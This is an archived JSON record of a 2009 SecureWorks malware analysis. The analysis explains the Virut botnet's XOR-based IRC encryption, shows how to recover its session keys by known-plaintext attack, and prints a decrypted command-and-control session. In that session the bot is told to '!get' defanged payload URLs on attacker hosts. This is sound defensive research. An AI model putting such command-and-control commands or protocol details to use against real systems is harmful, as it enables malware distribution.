{
    "id": "fc07cd31-a6b1-48f0-ad1e-c788530fb9bf",
    "created_at": "2023-01-12T15:00:31.28112Z",
    "updated_at": "2025-03-27T02:05:33.981119Z",
    "deleted_at": null,
    "sha1_hash": "fc2ab0533fa2ae38519ddd6950fb6e16cc980d0a",
    "title": "2009-06-23 - Virut Encryption Analysis",
    "authors": "",
    "file_creation_date": "2022-05-28T19:54:51Z",
    "file_modification_date": "2022-05-28T19:54:51Z",
    "file_size": 180264,
    "plain_text": "# Virut Encryption Analysis\n\n**secureworks.com/research/virut-encryption-analysis**\n\nJoe Stewart\n\n**Author: Joe Stewart, Director of Malware Research, SecureWorks**\n**Date: 23 June 2009**\n\nThe Windows virus known as Virut (sometimes Virtob) has been around for three years now,\nand despite being well-detected by most anti-virus engines, it remains a very prevalent\nthreat, currently accounting for 8% of all malware detections according to virus reports\n[received by Virus Bulletin.](http://www.virusbtn.com/resources/malwareDirectory/prevalence/index)\n\nThere are four other malware families listed higher on the prevalence scale, but Virut is the\nonly one that is an active botnet in the control of a single group. Even though we don't know\nexactly how many computers are infected with Virut at any given moment, the detection rate\ncertainly suggests that Virut may be the world's most successful botnet in terms of sheer\nnumber of infections over time.\n\nThe reason for Virut's success is simple - by infecting other Windows executables, it is able\nto spread not only as executables are copied from one computer to another normally, but by\npiggybacking on other malware as those threats are spread through various means such as\npeer-to-peer filesharing, browser exploits, and network worm activity.\n\nWhen Virut gets a foothold on a system, it connects to a command-and-control server using\nthe IRC protocol in order to download additional malware. For each install, the authors of\n\n\n-----\n\nVirut get a kickback, in what is known as a pay-per-install (PPI) scheme. We know from past\nresearch that such schemes are highly profitable, so clearly the group behind Virut is likely\nmaking a great deal of for very little ongoing work.\n\n[Recently, the good folks over at SourceFire blogged about several characteristics of the](https://blog.talosintelligence.com/2009/05/virut-analysis-and-snort-rule.html)\nlatest variant, mentioning that it now uses an encrypted protocol to communicate with its\ncommand-and-control servers. We here at the SecureWorks Counter Threat Unit noticed the\nsame thing - and although the encryption is simple, there is something intriguing about it.\n\nVirut still uses the same stripped-down IRC protocol underneath a layer of encryption. It\nbegins its communication by initializing a 32-bit session key - it uses the same initial key for\ndata received as well as data it sends. This key is generated by a call to a custom rand()\nfunction:\n\nThe rand function is shown below:\n\nThe rand function is seeded by a call to RDTSC, which returns the count of clock cycles\nexecuted by the CPU since the computer was booted. The rand function only uses the lower\nDWORD of this 64-bit value.\n\nVirut sends its IRC login after encrypting it with a simple algorithm that uses the initial\nsession key generated above:\n\n\n-----\n\nData returned by the IRC server is decrypted using the same algorithm and the same initial\nkey.\n\nThe algorithm itself is simple - XOR each byte by the session key, rotating the key 1 byte\neach time. Every other time, multiply the session key by 13. The multiplication operation\nprovides a fairly random-looking distribution of bytes, an improvement over simply XORing\nthe bytes by a static key, where patterns in the plaintext would still be visible in the ciphertext.\nSince a different key is used each time, simple visual analysis of several captured network\nstreams will reveal nothing useful to an observer, making it appear as though Virut is using\nstrong encryption.\n\nHowever, perhaps the most interesting aspect to the new encrypted protocol is that the\nrandomly-chosen 32-bit session key is never sent to the server - so how does the server\nknow how to properly decrypt the data? The only conclusion we can come to is that the\nserver uses a known-plaintext cryptanalysis attack on its own protocol in order to determine\nthe correct session key - an unusual approach to be sure.\n\nThe good news is, we can use this same technique ourselves - we know that the initial\nplaintext in the original Virut IRC protocol is \"NICK\". Doing an XOR of the first two bytes of\nthe cipher stream against \"NI\" (0x4e and 0x49) we can obtain the first two bytes of the\nsession key. For example, if given the ciphertext represented by hexadecimal 1b 0d d4 f7:\n```\n0x494e ^ 0x0d1b   =  0x4455\n \"NI\"  1b 0d   first 2 key bytes: 55 44\n\n```\n\n-----\n\nThen we need only compute the second two bytes by brute-force, XORing CK by the next\ntwo ciphertext bytes to get the post-multiplication key bytes, then reversing the multiplication\noperation (here we have to expand to 32-bit space and test 13 possible results). Once that\nlimited keyspace has been brute-forced, we have the original session key and can decrypt\nthe rest of the session.\n```\n0x4b43 ^ 0xf7d4   =  0xbc97\n \"CK\"  d4 f7  next 2 key bytes \n         (post-multiplication) \n0x4455#### x 13 = 0x#####bc97 ?\nBrute force:\n0x0bc97 / 13 = 0x0e81\n0x1bc97 / 13 = 0x2233\n0x2bc97 / 13 = 0x35e4\n0x3bc97 / 13 = 0x4995\n0x4bc97 / 13 = 0x5d46\n0x5bc97 / 13 = 0x70f7\n0x6bc97 / 13 = 0x84a9\n0x7bc97 / 13 = 0x985a\n0x8bc97 / 13 = 0xac0b\n0x9bc97 / 13 = 0xbfbc\n0xabc97 / 13 = 0xd36e\n0xbbc97 / 13 = 0xe71f\n0xcbc97 / 13 = 0xfad0\n(0x0e81 * 13) & 0xffff = 0xbc8d\n(0x2233 * 13) & 0xffff = 0xbc97\n0x44552233 rotr 16 = 0x22334455\n result       original key\n\n```\nAn example Virut encrypted IRC session with a random key might look like the following (red\nis client-to-server, blue is server-to-client):\n\nEncrypted (bytes represented in hexadecimal):\n```\n90 f2 c5 6d fc 64 a7 1f b0 b8 44 5c 63 17 01 2e\n45 77 e2 d5 04 5e 91 a8 9f 26 84 48 03 8d 7e f8\n10 80 01 33 bb 97 ce c6 0f 2b 66 3a e5 0a dd 16\nd7 e9 d0 17 43 80 16 5d e8 fb 99 98 57 e7 52 59\n44 96 ac e0 2d 39\n\n```\nDecrypted:\n\n\n-----\n\nNICK avqhfdtc\nUSER i030401 . . :%24c7234cb Service Pack 2\nJOIN #.3159\n\nEncrypted (bytes represented in hexadecimal):\n```\n8e f2 c8 61 fc 3f bc 40 d5 d4 70 61 4e 5a 74 47\n6d 0b cf b6 0e 18 8f bc ff 45 ed 30 6e f0 19 e2\n54 c4 44 38 ea c1 89 91 4c 73 67 0e e5 0c 8b 17\nc0 f8 80 7d 0d cc 1e 12 b9 9a fd ef 26 9f 44 54\n05 d7 fa ef 2c 0b c9 62 aa d4 54 4f cd 99 e9 c4\n1c 2a 14 1f 50 fc 2e 41 51 83 d2 33 76 b9 b4 0d\n74 d1 0f c4 5c 53 a3 ae c1 73 2d e6 85 60 41 31\n7e 63 71 d1 2c bb 87 df 94 09 6d b8 ff 2a 27 07\n2a b1 f8 a1 4e f1 27 5a 1f d3 3d 87 18 0b 59 6b\n97 87 db 6c c8 1d ef 48 f5 71 08 ee 20 6a 36 0d\n35 bc 69 0e 09 97 dc 41 3f 48 02 25 c3 43 c5 b4\n69 fe e2 0b 7b f0 cb 68 fe 1b 06 76 41 85 85 79\n52 a5 93 68 07 29 ce 18 37 ef bd 32 32 02 30 eb\nae 6d 90 41 80 96\n\n```\nDecrypted:\n\nPING :m.\nPING :m.\n:u. PRIVMSG avqhfdtc :!get hxxp://cock.8866.org:88/files/[redacted].gif\n:u. PRIVMSG avqhfdtc :!get hxxp://dl.guarddog2009.com/[redacted].exe\n:u. PRIVMSG avqhfdtc :!get hxxp://85.114.131.69/[redacted].exe\n(Malware filenames are redacted in the above session, but feel free to decrypt the bytes\nusing the known-plaintext cryptanalysis attack described above if you really need to see the\nfilenames.)\n\nThe payload URLs change often, and we have seen quite a bit of different malware\ndownloaded in the past. The malware downloaded in the above commands includes a rogue\nantivirus (scareware) program called Malware Doctor:\n\n\n-----\n\nLooking at the payment website for malware doctor gives us an idea of how much money\nthey make off of a single sale of the rogue AV - since most PPI affiliate programs pay 50% or\nmore commission for these installs, the Virut authors are likely to walk away with $30 of that,\nmultiplied by the thousands of victims they will likely manage to sucker in a week's time.\nAnother interesting thing to note is the rogue affiliate program's use of ChronoPay\n[(CHRPay.com), which is familiar to us based on our investigation of Antivirus XP 2008.](https://www.secureworks.com/research/rogue-antivirus-part-1)\nChronoPay appears to be the end payment system for a great deal of scareware activity, and\nyou can be sure they are taking a nice chunk of the cash flowing in this underground market.\n\n\n-----\n\nAnother interesting window popped up with one of the payloads installed by Virut, offering\nporn site passwords for a one-time fee. Since we have started seeing password-stealing\n[malware such as Coreflood become less discriminating about what sites it captures](https://www.secureworks.com/research/coreflood-report)\ncredentials for, it stands to reason that some criminal groups are sitting upon countless\nnumbers of porn site logins. It also makes sense that the criminals might try to monetize\nthose stolen logins somehow, and this might be one way they are accomplishing that.\n\n\n-----\n\nOne final thought: things like Virut never really go away - even if the botnet controllers are\ntaken down and the responsible parties brought to justice, older copies of viruses will\ncontinue to spread until the last copies of the platform they run on are deleted. However, it\nseems unlikely at this point that the botnet part of Virut will be disabled, since the commandand-control domains have managed to exist for three years with no action taken by the .pl\nregistry despite many complaints and massive evidence of Internet and computing abuse\nthat can be found with only a simple Google search for zief.pl.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2003 - 2009/2009-06-23 - Virut Encryption Analysis.pdf"
    ],
    "report_names": [
        "2009-06-23 - Virut Encryption Analysis.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535631,
    "ts_updated_at": 1743041133,
    "ts_creation_date": 1653767691,
    "ts_modification_date": 1653767691,
    "files": {
        "pdf": "https://archive.orkl.eu/fc2ab0533fa2ae38519ddd6950fb6e16cc980d0a.pdf",
        "text": "https://archive.orkl.eu/fc2ab0533fa2ae38519ddd6950fb6e16cc980d0a.txt",
        "img": "https://archive.orkl.eu/fc2ab0533fa2ae38519ddd6950fb6e16cc980d0a.jpg"
    }
}